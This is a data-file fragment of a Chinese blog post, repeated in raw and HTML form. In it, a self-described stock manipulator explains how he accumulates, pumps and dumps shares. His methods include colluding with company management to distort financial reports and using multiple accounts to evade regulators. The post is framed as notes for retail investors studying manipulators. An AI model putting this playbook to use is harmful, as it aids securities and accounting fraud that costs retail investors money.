n\n2）大势风险：还有一个问题是，当市场趋势向下时，自己却没发现，因为筹码还在自己手中，就想硬扛，这时候同样会完蛋，前几次大牛市结束后不少庄家摔跟头就在这上面。那么，应该如何应对风险，这就是，第一注意指标股的动向，因为坐庄的人对大盘指数动向非常敏感，当指标股向上，而一些主力控制的次要股却滞涨，或者有掉头迹象，那我就要先于股指下跌之前想办法将手里的筹码尽量的都交到散户手里去，尽量的腾出现金，只要手上有充足现金，是涨是跌我都不怕。涨了，我手上剩余的筹码完全可以将其打下来；要是跌了，那就可以购买更多的筹码。当大盘到底准备反转时，也同样会痕迹明显（从这里来看，就是指标股向下，主力控制的次要股却滞跌，或有掉头迹象）。\n\n三、谈谈顶和底的问题。\n\n现在不少人都在关心大盘跌到什么位置才是底，2000、1800、1235？说老实话，我不知道，我不但不知道大盘会跌到什么点位为底，我会连自己坐庄的股票能跌到什么价格为底都不知道，怎么能测算大盘。有人说，20元跌到5元行不行？到底了吗？我说不行，也许跌到1~2元，也许会到8元就算到底了，在股市里没什么顶和底之说，真正起作用的就是供求关系，当跌到供求平衡时，底自然就到了。\n\n例如我的股票，我每天都在让它波动，涨涨跌跌，但某一天我发现，我卖出去的股票，用这些钱买不回来更多或者同样多的股票了，这时候我就不可能再向下做了，这里就应该是它的底了。也许是5元的位置，也许1元的位置还不到，又有谁知道在哪个位置能达平衡呢，只能不断的测试。\n\n顶部也一样，我向上拉，却没了跟风的，那我高价买来的股票又能派发给谁？当然，我拉高给你看价格却又是一码事，底部也一样（同样，震仓中继调整其实就是出货和吸筹的变种，只不过该时段的对手盘是短线盘）。\n\n在指数里，同样如此，如果进出资金能达到平衡，那指数就到底了；如果不能，一直要跌到平衡为止。\n\n四、庄家在下跌中是如何赚钱的？\n\n不少人有时候不理解，庄家的成本是20元，他将股价打到10元或者15元，他不也亏了吗？这真是傻庄，其实散户是不明白的，庄家赚钱的手段很多时候是和散户不同的。我来举个例子，600331，当时有些机构的成本是70多元，但开盘后连砸7个跌停板，最后在38元被打开，按理说机构亏惨，如果庄不砸跌停板，出货的价位不是高些吗？损失不是小些吗？\n\n其实不是这种情况，不砸跌停板出货，散户也会跟着出；而承接盘有限，机构的货是出不掉的，慢慢的下跌机构损失会更惨，并且你由于价格没有吸引力，找不到对手盘，那就成了钝刀子割肉，痛苦只有自知（主力的弱点）。\n\n采用了猛砸跌停的办法，市场的目光就会集中到那上面来（市场知名度），当跌到一半时，有协同私募或者机构开始巨量吃单，因为在这几天的跌停中市场的关注度非常高，而出现巨单吃货了，这说明这时的股价应该反弹了，技术上超卖出现，股价腰斩，怎么着都要反弹个百分之十几到二十，所以散户、大户一哄而上，机构卖单被哄抢。但现实情况并不是散户和大户们所想象的，在熊市中放巨量的往往都是出货，看似大单扫货，其实就是庄家们设的陷阱，然后利益分享。\n\n再举个南车上市的例子，上市价超过发行价60%以上，5个机构席位齐刷刷的排在购买的前5名，这些机构傻了吗？非要溢价60%来接盘，特别在熊市中，还怕买不到筹码？如果等几天再买，也许到发行价都有可能。其实，机构们一点不傻，这不过是机构之间穿连裆裤的表演，那些获得60%以上溢价的会给这些接盘的机构分配一定利润的，而且这些机构买入的也并不多，更多的筹码是溢价交给了其他人，包括大量散户手中了。对接入大部分高溢价筹码的这部分人，那些获利者就不用考虑什么了。\n\n这里我还回到前面，600331，那些机构70多元的成本，却卖出38元，那不巨亏吗？这不过是散户思维，从现金数额来说，机构是大放血了，但从筹码角度来说，机构可以按现在复权价格18元，等于赚了一倍的筹码，只要涨回30多，机构的本就回来了，而那些守在38以上的人，只好等驴年马月了。这还不排除后面继续下跌的可能，如果股价继续下跌，机构就更容易获利。\n\n所以，我操作的股票我就希望它能跌下来，尽量的低。举个例子，在20元到18元区间，我出掉了手中的20%股票，在18到16区间我又出掉18%的股票，后面我就要回补，因为在这种下跌的情况下，不少止损盘开始涌现，还有些人要补仓，这时候我就要根据筹码情况做反弹，为什么要做反弹呢？主要是吸引抄底盘进来，当然，如果抄底盘巨多，第二天我就再反手做空。\n\n（主力的优势在于可控盘，短期顶底都是自己的，短差做起来极端顺手，所以短线盘的出路就在于：利用船小好调头的优势使操作水平高于主力，最起码要和主力持平。根据这里所述，思路之一即对抄底跟风盘的判断，但是主力的弱点同时也是主力的优点，主力很容易了解到抄底跟风盘的情况，而散户则不知。这就构成了一对矛盾，导致主力和散户优劣平衡。）\n\n一般情况下第一天的反弹抄底的是不多的，只要进行两天，散户一看，这个股怎么天天涨，特别是割肉盘和补仓盘，他们一般都会追进来，而高位的一看涨了几天，不卖算了，等几天也许还能赚点。这时候我再反手做空，将他们套住。这中间我赚多少？因为拉的当中还要派发利润，所以，每一段的下跌可以保持一定的利润。\n\n那我为什么希望我坐庄的股价尽量低？你想想，你如果开个商场，你是希望你经营的货物便宜还是贵？自然是便宜的好，因为这样一来所用资金量就少。10元加1元，人家就嫌贵了；如果1元加1角，不显山露水的，没人和你计较，而和10元和1元所赚比例却是一样的。股票也一样，1元股票涨到1。5元，没多少人感觉什么；但10元涨到15元呢？这就是中国股票市场牛短熊长的根本原因，庄没几个希望股价很高来增加自己的成本。\n\n五、谈谈散户的和庄家的定位问题。\n\n在一个大草原上，小股民就是羊群，而庄家是狼。我这样定位大家可能没什么意见吧，中国股市里70%股民赔钱，这基本上是真实的。就像打麻将一样，四个人打，三个人赔。这三个人的钱自然流入到那一个人口袋里去了，也就是说，股民所赔的数万亿既没消失，也没挥发，而是转移，转移到少数人口袋里去了。这就是狼吃羊的故事。\n\n在草原中，羊看到狼会跑，为什么？怕它把自己吃了。但在股市里却不一样，大部分人买股票喜欢买有庄股，说有庄股拉起来就凶了，会涨的快，最好是强庄。羊在草原上吃什么？吃草。它会选择有狼的地方去吗？而且这个狼还非常彪悍。绝对不会。\n\n这就是股民的自我定位上的错误，你本来是羊，吃草就行了，这个草就是找个业绩良好的股，在合适的价格下把它买来，然后每年等着分红送股来升值（中国股市分红吗？）。但大部分股民不这样，总想跟着狼后面吃点残羹剩渣，这还有不亏损的道理？所以，大草原上的羊群大部分保留，而股民大部分都被吃了。\n\n六、主力是如何对散户进行教育灌输的？\n\n我说的这个题目，不少人可能觉得新鲜，没听说过这样的事，主力还能对我进行教育灌输？是不是维稳或者保障群众财产性收入之类的。我说不是，其实你没感觉，那就是主力的成功，主力不需要你感觉什么，只要你按着他的指挥去做就行。主力有这样的本事？那他叫我割肉我就割肉，让我站顶我就站顶，那我的钱不都让主力赚去了？对，情况就是这样。\n","source":"_posts/[finance]-top-buyer.md","raw":"---\nlayout: title\ntitle: 游资 买入 卖出-主要是想体验一下交易\ndate: 2017-05-11 09:11:06\ntags: finance\ncategories: Lifestyle\n---\n\n所以就要做一些笔记呗\n\n有一些摘自知乎和雪球。观点和意见都不尽同意。\n\n## 入场和出场\n\n假如我是一个庄家，我会怎么做？\n\n股票市场的定律是一赢两平七亏，意思是70%以上的人都会亏损。那散户如何才能站到赢利的10%人的群体中？我认为，机构为了赚散户钱，不断的在研究散户心理和行为学，我们散户不妨反过来，把自己当成机构投资者，也来研究一下机构的心理和行为学，这样才能在这个充满陷阱、欺诈、骗术和谣言四起的市场里立于不败之地。\n\n如果我是机构投资者，要想做一支股票，我认为我先要找到一支大小合适，前景无需多么优秀，但几年之内绝对不会倒闭的那一种。然后我去拜会该公司领导，告诉他我想投资他那支股票，请他们配合。如何配合呢？就是在我吸筹时，在公报时尽量将业绩放平，或者适当隐藏利润，这一点公司很容易做到，只要对报表进行适当调整就行了，例如，将某些损益一个季度提完，使其报表看上去亏损；或者将后面数年的费用半年摊完，这都使得当期报表非常难看。\n\n在这之前，我肯定是要进一些筹码的，这些筹码主要用来砸盘的。怎么收集这些砸盘的筹码？我不会每天慢慢去收集，因为这样会使股票天天上涨，反而难以收到足够的筹码，还容易被散户抢酬，并使技术指标形成向上趋势，更使自己收集成本提高。我会在某一天用大涨的办法来收集，当连跌数天后，散户都悲观失望，猛然一个大涨，套牢的看到了希望，不会抛出；而短线获利的，可能就交枪了，其实，在这个价位我只是要砸盘的筹码，不需要收集很多，因此用猛然大涨的办法就很容易达到目的（见底前平台，成交量会放大）。\n\n第二天来个低开。为什么要低开而不高开，因为我昨天收集的筹码并不准备获利，而且要让昨天追风进去的短线筹码帮我砸盘，如果高开，很容易让短线筹码获利，他们就会在下跌途中有更多的资金来跟我抢酬，所以一定要低开，消耗这些短线资金（盈利的短线盘很关注这只股，而亏损的短线盘则极少再次关注它）。\n\n在这个下跌途中，我将逐步用单托底，因为我要形成自己的底仓（难道这不会造成成交量的放大，而非极度缩量？）。经过几天的连续下跌，有些割肉的筹码就会回补自己的仓位，这时候我不能让他们回补，我必须迅速的吃上去让他们追风（直线拔升方式常见的原因），当形成追风盘时，我将在底部的部分筹码高抛，一是为了降低成本，二是腾出资金，然后再迅速的砸下去。同样的，我会边托边砸，这样一来我就会得到更多价格更低的筹码。\n\n当跌到很低位时，基本上就没人和我抢筹码了，因为在这个下跌途中，我通过不断的高抛低吸，不断的大幅度振荡，将大部分抄底的，抢反弹的都套在下跌途中，或者将他们亏损怠尽，使其不敢再来涉足这个股票，这时候我的目的就达到了（把买盘都赶出去）。而公司的配合在这时就非常关键，长时间的业绩没有任何起色，使大部分散户因怀疑其会不会ST，因而恐惧惊慌，高位筹码就会不断的掉落，我就可以在底部横盘当中不断的高抛低吸来收集筹码，这个可能需要较长时间，关键看顶部筹码掉落程度而定，如果高位筹码长时间的不松动，那我就不会去拉这只股票。（筹码流动）\n\n当筹码收集足够多时，公司的业绩也会转好了，因为在我收集筹码当中，公司将后面几年能想的出来的损益，或者费用都在那一年半载中摊完了，后面的报表当然好看。这时候我拉起来毫不费力，也无需多大成本。当这个市场里其他人看到这个股原来这么优秀，必然跟风者众，我就在这这当中逐步减仓。（（1）筹码结构（资金结构）（2）技术指标（3）业绩预期）\n\n公司能如此配合，那他能得到什么好处？其实很简单，我将股票拉到高位，他们也能卖个好价钱；在低位时，他们同样可以购入自己的股票，还能挣得名声，这样一来收益会相当可观，何乐而不为？\n\n这当然要和大盘走势相同，在这中间，散户该知道怎么办了吧。\n\n当然，如果我做庄，还必需考虑很多问题：第一是证监会的监控，他们虽然老虎不敢碰，或者就是为虎作猖，但捏死个把苍蝇还是不成问题的，所以，操控股票不能让他们抓住把柄，这时候就要考虑多户头，或者拉几个私募大户集体作战。\n\n第二要考虑产业资本的问题，如果我们拉的时候，他们看到利润可观，结果大量抛出筹码，那我们就惨了，必然会亏本出局，在做之前就必需先和他们沟通好，而且还要了解他们手上的流通盘是多少，抛售意向如何，这就是大小非问题。\n\n第三个要考虑的是老庄，如果这个股没有被老庄放弃，那我是尽量不会去碰的，因为一但被老庄反做，那你死得就惨了，就像中国联通套游资一样，那死得是非常惨的，所以，选股非常重要。\n\n第四个就是大盘状况，跟风的多不多，社会上的存量资金足不足，就像现在这样，大部分散户或者大户都被大宰一刀，这时候就不适宜做股票，你拉人家卖，结果把自己套在里面。那现在最适宜的就是砸股票。一般人都有个心态，20元买的股，跌到15元不卖，跌到10元不卖，跌到5元仍然没多少会人卖，但是你要跌到2元再拉回4元，不少人一看翻倍基本上都会割肉的，特别是长时间的向下或者横盘（当然，翻一倍后作中期调整的概率可能性，在操作系统上可认为是100%）。\n\n如果这些问题都解决了，砸盘就要开始。砸多少为适宜？根据大盘状况，每天操盘必需跟着大盘走，当大盘大跌时，你必需深砸下去，这时候成本很低，只要用少量筹码将关键点位砸开即可，会有止损盘帮你接着砸下去。但是尾盘必需进一些筹码，防止第二天大盘走低或者走高，有一定量筹码就好灵活掌握，也就是说，要在操盘时盯着指标股（借势才是合格的操盘手）。\n\n为什么要盯着指标股去做？关键就在于成本，随着大盘波动，你的成本最低，指标股跌时，你也跌，所用砸盘筹码量最少，因为没有多少人敢买，可以深砸（并不是什么时候都可以深砸高拉的）。当大盘涨时你去拉，同样无须买多少，只要将关键点位的筹码买掉即可，有人会将股价推上去，到一定高点，你还可以将低位进的筹码出掉一些，这样可以腾出一点资金做一点差价。所以，我们看到的股市局面就是要涨一起涨，要跌大家都去跌。\n\n在股市中的人分好几种，趋势投资者，套牢后不理不睬者，技术派，基本面派，长线客，短线炒家等等。\n\n我要在这个股票里做庄，这些人我都要面对，尽量的让他们在我控制的这个股票里少赚或者割肉而去，这时候我就要用很多办法来对付，因为他们赚多了，意味着我就赚少了，他们不割肉，我就赚不到钱（针对某一只股票，主力要面对的是阶段性对手盘，同样阶段性对手盘也面对着阶段性对手盘）。\n\n对趋势投资者，我没什么好办法，只能将他们看做锁仓的一员；但对其他人，我平时的吃喝玩乐就全靠他们了。我一般最喜欢套牢后不理不睬的，这些人把钱交给我后帮我锁定了大部分筹码，使我在底位有充足的资金纵横驰骋（？待定，低位时主力要高抛低吸短差收股票，但因持仓量少对盘面的控制力差，所以非常需要锁仓套牢盘，套牢盘的不动，造就了主力（新资金）的异动（才能让交易者看出来））。\n\n基本面派也是我喜欢的第二位，因为当我将股价拉高后他们基本就接手了，企业的基本面在我拉高股价后变得非常亮丽，他们就会来接盘；等他们接完后公司基本面就发生改变，他们在低位就将筹码再还给我。\n\n技术派一般短线较多，喜欢做波段，这里的人有自认为技术高明的，什么KDJ金叉、死叉，什么MACD、CR、量价关系，什么费波纳奇黄金分割位，什么艾略特的波浪理论，还有江恩曲线等等，等等，但我做股票一般不看这个，我一般只盯着今天我下多少单，在某些价位进来多少单，大一些的户头在什么价位进出。这个对我来说非常关键，因为这决定了第二天该如何操作，有时候需要对他们安抚，让他们帮忙将股票在手上多留几天，以使活动筹码减少。但有时候就必须让他们出局，特别是短线客，当今天发现短线游资进来多了，第二天不管怎样都要将他们杀出局，哪怕逆大盘而动（不杀不行啊，不杀盘面就会失控，破坏坐庄计划）。回过头来看，呵呵，真搞笑，K线走的还真符合某些技术指标特点。偶然乎，必然乎（有意思，偶然中的必然）。\n\n这里解释一下我为什么要猛杀游资。\n\n其实这关乎自己的短期收益，因为短线客和游资的钱最好赚，他们持筹码的时间短，可以使我非常短的时间里获利。例如套牢盘，你只能一次性的赚他一下，他然后就不动了，你就拿他一点办法都没有，这中间有时候长达几年，在这几年里我可是要吃要喝的；基本面派也使我获利不多，因为他们的利润我还要和公司均分。\n\n但短线客和游资就不同了，我在一个波段中就可以获利丰厚。那怎么做呢?\n\n第一是逐步拉升，这时候技术指标就开始走好，技术派的人一看技术指标，一般都容易被诱惑进来，这中间我就边拉边卖，需要控制的就是在顶背离之前（背驰段之中）将筹码交他们手中，使他们看上去技术指标仍然没有到顶，股价还可以涨得更高，这时候第二天来个冲高回落，然后第三天猛然下跌，他们基本上就开始交枪了（这个动作很常见），不用我来，股价就下去了，这中间自然我设定好价位来捡果实。\n\n对游资更是这样，上半段我来拉，游资一看股价看涨，立即蜂拥而来，那下半段我就将部分筹码交给他们，第二天我来个低开低走，游资一看势头不对，立即出逃，这时候我就要看出逃数量，并计算自己的成果，如果出逃数量足够多，那我下午就拉起，因为大部分短线客都走了，我就不需要支付多少利润出去，很容易将股价拉起来，而我在这两天来回的差价最少是赚交易额的3%左右。\n\n但发现没有走多少时那我就继续向下做。这就是不少散户疑问的，为什么我一卖就涨，一买就跌啊?因为你跟大部分人的行为是一致的。（能坐庄的都能打单，对筹码结构很清楚，主力当然根据短线客中大部分人的行为行动）呵呵。\n\n二、坐庄的风险是什么？\n\n1）监管风险：一是操作这只股票的不会是我一个庄，一般都是邀请几个人来联手，就像大草原上的猎狗一样，采用群体战术才能更容易获得成功。要是一个人，第一不一定有这个实力，第二就是太容易被人抓住把柄，搞不好打不到狐狸还惹一身骚，所以，邀请朋友来合作是肯定的，就谁主谁次的问题了。既然是合作，风险也是明显的，当市场出现波动时，其中一个朋友立马放水，这时候你就栽了，很长时间的辛苦都会打水漂。\n\n2）大势风险：还有一个问题是，当市场趋势向下时，自己却没发现，因为筹码还在自己手中，就想硬扛，这时候同样会完蛋，前几次大牛市结束后不少庄家摔跟头就在这上面。那么，应该如何应对风险，这就是，第一注意指标股的动向，因为坐庄的人对大盘指数动向非常敏感，当指标股向上，而一些主力控制的次要股却滞涨，或者有掉头迹象，那我就要先于股指下跌之前想办法将手里的筹码尽量的都交到散户手里去，尽量的腾出现金，只要手上有充足现金，是涨是跌我都不怕。涨了，我手上剩余的筹码完全可以将其打下来；要是跌了，那就可以购买更多的筹码。当大盘到底准备反转时，也同样会痕迹明显（从这里来看，就是指标股向下，主力控制的次要股却滞跌，或有掉头迹象）。\n\n三、谈谈顶和底的问题。\n\n现在不少人都在关心大盘跌到什么位置才是底，2000、1800、1235？说老实话，我不知道，我不但不知道大盘会跌到什么点位为底，我会连自己坐庄的股票能跌到什么价格为底都不知道，怎么能测算大盘。有人说，20元跌到5元行不行？到底了吗？我说不行，也许跌到1~2元，也许会到8元就算到底了，在股市里没什么顶和底之说，真正起作用的就是供求关系，当跌到供求平衡时，底自然就到了。\n\n例如我的股票，我每天都在让它波动，涨涨跌跌，但某一天我发现，我卖出去的股票，用这些钱买不回来更多或者同样多的股票了，这时候我就不可能再向下做了，这里就应该是它的底了。也许是5元的位置，也许1元的位置还不到，又有谁知道在哪个位置能达平衡呢，只能不断的测试。\n\n顶部也一样，我向上拉，却没了跟风的，那我高价买来的股票又能派发给谁？当然，我拉高给你看价格却又是一码事，底部也一样（同样，震仓中继调整其实就是出货和吸筹的变种，只不过该时段的对手盘是短线盘）。\n\n在指数里，同样如此，如果进出资金能达到平衡，那指数就到底了；如果不能，一直要跌到平衡为止。\n\n四、庄家在下跌中是如何赚钱的？\n\n不少人有时候不理解，庄家的成本是20元，他将股价打到10元或者15元，他不也亏了吗？这真是傻庄，其实散户是不明白的，庄家赚钱的手段很多时候是和散户不同的。我来举个例子，600331，当时有些机构的成本是70多元，但开盘后连砸7个跌停板，最后在38元被打开，按理说机构亏惨，如果庄不砸跌停板，出货的价位不是高些吗？损失不是小些吗？\n\n其实不是这种情况，不砸跌停板出货，散户也会跟着出；而承接盘有限，机构的货是出不掉的，慢慢的下跌机构损失会更惨，并且你由于价格没有吸引力，找不到对手盘，那就成了钝刀子割肉，痛苦只有自知（主力的弱点）。\n\n采用了猛砸跌停的办法，市场的目光就会集中到那上面来（市场知名度），当跌到一半时，有协同私募或者机构开始巨量吃单，因为在这几天的跌停中市场的关注度非常高，而出现巨单吃货了，这说明这时的股价应该反弹了，技术上超卖出现，股价腰斩，怎么着都要反弹个百分之十几到二十，所以散户、大户一哄而上，机构卖单被哄抢。但现实情况并不是散户和大户们所想象的，在熊市中放巨量的往往都是出货，看似大单扫货，其实就是庄家们设的陷阱，然后利益分享。\n\n再举个南车上市的例子，上市价超过发行价60%以上，5个机构席位齐刷刷的排在购买的前5名，这些机构傻了吗？非要溢价60%来接盘，特别在熊市中，还怕买不到筹码？如果等几天再买，也许到发行价都有可能。其实，机构们一点不傻，这不过是机构之间穿连裆裤的表演，那些获得60%以上溢价的会给这些接盘的机构分配一定利润的，而且这些机构买入的也并不多，更多的筹码是溢价交给了其他人，包括大量散户手中了。对接入大部分高溢价筹码的这部分人，那些获利者就不用考虑什么了。\n\n这里我还回到前面，600331，那些机构70多元的成本，却卖出38元，那不巨亏吗？这不过是散户思维，从现金数额来说，机构是大放血了，但从筹码角度来说，机构可以按现在复权价格18元，等于赚了一倍的筹码，只要涨回30多，机构的本就回来了，而那些守在38以上的人，只好等驴年马月了。这还不排除后面继续下跌的可能，如果股价继续下跌，机构就更容易获利。\n\n所以，我操作的股票我就希望它能跌下来，尽量的低。举个例子，在20元到18元区间，我出掉了手中的20%股票，在18到16区间我又出掉18%的股票，后面我就要回补，因为在这种下跌的情况下，不少止损盘开始涌现，还有些人要补仓，这时候我就要根据筹码情况做反弹，为什么要做反弹呢？主要是吸引抄底盘进来，当然，如果抄底盘巨多，第二天我就再反手做空。\n\n（主力的优势在于可控盘，短期顶底都是自己的，短差做起来极端顺手，所以短线盘的出路就在于：利用船小好调头的优势使操作水平高于主力，最起码要和主力持平。根据这里所述，思路之一即对抄底跟风盘的判断，但是主力的弱点同时也是主力的优点，主力很容易了解到抄底跟风盘的情况，而散户则不知。这就构成了一对矛盾，导致主力和散户优劣平衡。）\n\n一般情况下第一天的反弹抄底的是不多的，只要进行两天，散户一看，这个股怎么天天涨，特别是割肉盘和补仓盘，他们一般都会追进来，而高位的一看涨了几天，不卖算了，等几天也许还能赚点。这时候我再反手做空，将他们套住。这中间我赚多少？因为拉的当中还要派发利润，所以，每一段的下跌可以保持一定的利润。\n\n那我为什么希望我坐庄的股价尽量低？你想想，你如果开个商场，你是希望你经营的货物便宜还是贵？自然是便宜的好，因为这样一来所用资金量就少。10元加1元，人家就嫌贵了；如果1元加1角，不显山露水的，没人和你计较，而和10元和1元所赚比例却是一样的。股票也一样，1元股票涨到1。5元，没多少人感觉什么；但10元涨到15元呢？这就是中国股票市场牛短熊长的根本原因，庄没几个希望股价很高来增加自己的成本。\n\n五、谈谈散户的和庄家的定位问题。\n\n在一个大草原上，小股民就是羊群，而庄家是狼。我这样定位大家可能没什么意见吧，中国股市里70%股民赔钱，这基本上是真实的。就像打麻将一样，四个人打，三个人赔。这三个人的钱自然流入到那一个人口袋里去了，也就是说，股民所赔的数万亿既没消失，也没挥发，而是转移，转移到少数人口袋里去了。这就是狼吃羊的故事。\n\n在草原中，羊看到狼会跑，为什么？怕它把自己吃了。但在股市里却不一样，大部分人买股票喜欢买有庄股，说有庄股拉起来就凶了，会涨的快，最好是强庄。羊在草原上吃什么？吃草。它会选择有狼的地方去吗？而且这个狼还非常彪悍。绝对不会。\n\n这就是股民的自我定位上的错误，你本来是羊，吃草就行了，这个草就是找个业绩良好的股，在合适的价格下把它买来，然后每年等着分红送股来升值（中国股市分红吗？）。但大部分股民不这样，总想跟着狼后面吃点残羹剩渣，这还有不亏损的道理？所以，大草原上的羊群大部分保留，而股民大部分都被吃了。\n\n六、主力是如何对散户进行教育灌输的？\n\n我说的这个题目，不少人可能觉得新鲜，没听说过这样的事，主力还能对我进行教育灌输？是不是维稳或者保障群众财产性收入之类的。我说不是，其实你没感觉，那就是主力的成功，主力不需要你感觉什么，只要你按着他的指挥去做就行。主力有这样的本事？那他叫我割肉我就割肉，让我站顶我就站顶，那我的钱不都让主力赚去了？对，情况就是这样。\n","slug":"[finance]-top-buyer","published":1,"updated":"2019-03-11T04:51:19.499Z","comments":1,"photos":[],"link":"","_id":"ckkljsasa000zr242mewg2uiv","content":"<p>所以就要做一些笔记呗</p>\n<p>有一些摘自知乎和雪球。观点和意见都不尽同意。</p>\n<h2 id=\"入场和出场\"><a href=\"#入场和出场\" class=\"headerlink\" title=\"入场和出场\"></a>入场和出场</h2><p>假如我是一个庄家，我会怎么做？</p>\n<p>股票市场的定律是一赢两平七亏，意思是70%以上的人都会亏损。那散户如何才能站到赢利的10%人的群体中？我认为，机构为了赚散户钱，不断的在研究散户心理和行为学，我们散户不妨反过来，把自己当成机构投资者，也来研究一下机构的心理和行为学，这样才能在这个充满陷阱、欺诈、骗术和谣言四起的市场里立于不败之地。</p>\n<p>如果我是机构投资者，要想做一支股票，我认为我先要找到一支大小合适，前景无需多么优秀，但几年之内绝对不会倒闭的那一种。然后我去拜会该公司领导，告诉他我想投资他那支股票，请他们配合。如何配合呢？就是在我吸筹时，在公报时尽量将业绩放平，或者适当隐藏利润，这一点公司很容易做到，只要对报表进行适当调整就行了，例如，将某些损益一个季度提完，使其报表看上去亏损；或者将后面数年的费用半年摊完，这都使得当期报表非常难看。</p>\n<p>在这之前，我肯定是要进一些筹码的，这些筹码主要用来砸盘的。怎么收集这些砸盘的筹码？我不会每天慢慢去收集，因为这样会使股票天天上涨，反而难以收到足够的筹码，还容易被散户抢酬，并使技术指标形成向上趋势，更使自己收集成本提高。我会在某一天用大涨的办法来收集，当连跌数天后，散户都悲观失望，猛然一个大涨，套牢的看到了希望，不会抛出；而短线获利的，可能就交枪了，其实，在这个价位我只是要砸盘的筹码，不需要收集很多，因此用猛然大涨的办法就很容易达到目的（见底前平台，成交量会放大）。</p>\n<p>第二天来个低开。为什么要低开而不高开，因为我昨天收集的筹码并不准备获利，而且要让昨天追风进去的短线筹码帮我砸盘，如果高开，很容易让短线筹码获利，他们就会在下跌途中有更多的资金来跟我抢酬，所以一定要低开，消耗这些短线资金（盈利的短线盘很关注这只股，而亏损的短线盘则极少再次关注它）。</p>\n<p>在这个下跌途中，我将逐步用单托底，因为我要形成自己的底仓（难道这不会造成成交量的放大，而非极度缩量？）。经过几天的连续下跌，有些割肉的筹码就会回补自己的仓位，这时候我不能让他们回补，我必须迅速的吃上去让他们追风（直线拔升方式常见的原因），当形成追风盘时，我将在底部的部分筹码高抛，一是为了降低成本，二是腾出资金，然后再迅速的砸下去。同样的，我会边托边砸，这样一来我就会得到更多价格更低的筹码。</p>\n<p>当跌到很低位时，基本上就没人和我抢筹码了，因为在这个下跌途中，我通过不断的高抛低吸，不断的大幅度振荡，将大部分抄底的，抢反弹的都套在下跌途中，或者将他们亏损怠尽，使其不敢再来涉足这个股票，这时候我的目的就达到了（把买盘都赶出去）。而公司的配合在这时就非常关键，长时间的业绩没有任何起色，使大部分散户因怀疑其会不会ST，因而恐惧惊慌，高位筹码就会不断的掉落，我就可以在底部横盘当中不断的高抛低吸来收集筹码，这个可能需要较长时间，关键看顶部筹码掉落程度而定，如果高位筹码长时间的不松动，那我就不会去拉这只股票。（筹码流动）</p>\n<p>当筹码收集足够多时，公司的业绩也会转好了，因为在我收集筹码当中，公司将后面几年能想的出来的损益，或者费用都在那一年半载中摊完了，后面的报表当然好看。这时候我拉起来毫不费力，也无需多大成本。当这个市场里其他人看到这个股原来这么优秀，必然跟风者众，我就在这这当中逐步减仓。（（1）筹码结构（资金结构）（2）技术指标（3）业绩预期）</p>\n<p>公司能如此配合，那他能得到什么好处？其实很简单，我将股票拉到高位，他们也能卖个好价钱；在低位时，他们同样可以购入自己的股票，还能挣得名声，这样一来收益会相当可观，何乐而不为？</p>\n<p>这当然要和大盘走势相同，在这中间，散户该知道怎么办了吧。</p>\n<p>当然，如果我做庄，还必需考虑很多问题：第一是证监会的监控，他们虽然老虎不敢碰，或者就是为虎作猖，但捏死个把苍蝇还是不成问题的，所以，操控股票不能让他们抓住把柄，这时候就要考虑多户头，或者拉几个私募大户集体作战。</p>\n<p>第二要考虑产业资本的问题，如果我们拉的时候，他们看到利润可观，结果大量抛出筹码，那我们就惨了，必然会亏本出局，在做之前就必需先和他们沟通好，而且还要了解他们手上的流通盘是多少，抛售意向如何，这就是大小非问题。</p>\n<p>第三个要考虑的是老庄，如果这个股没有被老庄放弃，那我是尽量不会去碰的，因为一但被老庄反做，那你死得就惨了，就像中国联通套游资一样，那死得是非常惨的，所以，选股非常重要。</p>\n<p>第四个就是大盘状况，跟风的多不多，社会上的存量资金足不足，就像现在这样，大部分散户或者大户都被大宰一刀，这时候就不适宜做股票，你拉人家卖，结果把自己套在里面。那现在最适宜的就是砸股票。一般人都有个心态，20元买的股，跌到15元不卖，跌到10元不卖，跌到5元仍然没多少会人卖，但是你要跌到2元再拉回4元，不少人一看翻倍基本上都会割肉的，特别是长时间的向下或者横盘（当然，翻一倍后作中期调整的概率可能性，在操作系统上可认为是100%）。</p>\n<p>如果这些问题都解决了，砸盘就要开始。砸多少为适宜？根据大盘状况，每天操盘必需跟着大盘走，当大盘大跌时，你必需深砸下去，这时候成本很低，只要用少量筹码将关键点位砸开即可，会有止损盘帮你接着砸下去。但是尾盘必需进一些筹码，防止第二天大盘走低或者走高，有一定量筹码就好灵活掌握，也就是说，要在操盘时盯着指标股（借势才是合格的操盘手）。</p>\n<p>为什么要盯着指标股去做？关键就在于成本，随着大盘波动，你的成本最低，指标股跌时，你也跌，所用砸盘筹码量最少，因为没有多少人敢买，可以深砸（并不是什么时候都可以深砸高拉的）。当大盘涨时你去拉，同样无须买多少，只要将关键点位的筹码买掉即可，有人会将股价推上去，到一定高点，你还可以将低位进的筹码出掉一些，这样可以腾出一点资金做一点差价。所以，我们看到的股市局面就是要涨一起涨，要跌大家都去跌。</p>\n<p>在股市中的人分好几种，趋势投资者，套牢后不理不睬者，技术派，基本面派，长线客，短线炒家等等。</p>\n<p>我要在这个股票里做庄，这些人我都要面对，尽量的让他们在我控制的这个股票里少赚或者割肉而去，这时候我就要用很多办法来对付，因为他们赚多了，意味着我就赚少了，他们不割肉，我就赚不到钱（针对某一只股票，主力要面对的是阶段性对手盘，同样阶段性对手盘也面对着阶段性对手盘）。</p>\n<p>对趋势投资者，我没什么好办法，只能将他们看做锁仓的一员；但对其他人，我平时的吃喝玩乐就全靠他们了。我一般最喜欢套牢后不理不睬的，这些人把钱交给我后帮我锁定了大部分筹码，使我在底位有充足的资金纵横驰骋（？待定，低位时主力要高抛低吸短差收股票，但因持仓量少对盘面的控制力差，所以非常需要锁仓套牢盘，套牢盘的不动，造就了主力（新资金）的异动（才能让交易者看出来））。</p>\n<p>基本面派也是我喜欢的第二位，因为当我将股价拉高后他们基本就接手了，企业的基本面在我拉高股价后变得非常亮丽，他们就会来接盘；等他们接完后公司基本面就发生改变，他们在低位就将筹码再还给我。</p>\n<p>技术派一般短线较多，喜欢做波段，这里的人有自认为技术高明的，什么KDJ金叉、死叉，什么MACD、CR、量价关系，什么费波纳奇黄金分割位，什么艾略特的波浪理论，还有江恩曲线等等，等等，但我做股票一般不看这个，我一般只盯着今天我下多少单，在某些价位进来多少单，大一些的户头在什么价位进出。这个对我来说非常关键，因为这决定了第二天该如何操作，有时候需要对他们安抚，让他们帮忙将股票在手上多留几天，以使活动筹码减少。但有时候就必须让他们出局，特别是短线客，当今天发现短线游资进来多了，第二天不管怎样都要将他们杀出局，哪怕逆大盘而动（不杀不行啊，不杀盘面就会失控，破坏坐庄计划）。回过头来看，呵呵，真搞笑，K线走的还真符合某